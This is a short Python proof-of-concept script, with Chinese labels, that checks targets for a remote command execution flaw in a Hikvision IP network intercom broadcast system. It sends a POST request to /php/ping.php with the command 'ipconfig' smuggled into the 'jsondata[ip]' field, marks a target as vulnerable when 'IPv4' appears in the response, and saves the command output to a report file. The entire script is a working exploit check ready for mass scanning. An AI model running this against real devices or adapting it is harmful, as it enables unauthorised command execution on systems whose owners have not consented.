import requests
import time
import buter
import wirtefile

poc = '/php/ping.php'
info = "海康威视IP网络对讲广播系统RCE"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type":"application/x-www-form-urlencoded"
}
data = {"jsondata[type]": "99", "jsondata[ip]": "ipconfig"}

def hkvsIPRCE(url):
    try:
        reps = requests.post(url=url + poc, headers=headers,data=data, verify=False, timeout=10)
        if reps.status_code == 200 and ('ipv4' in reps.text or 'IPv4' in reps.text) :
            print(buter.colors.GREEN +  f"存在{info} url : {url}" + buter.colors.END)
            reptext = reps.url + "\n" + reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED + f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
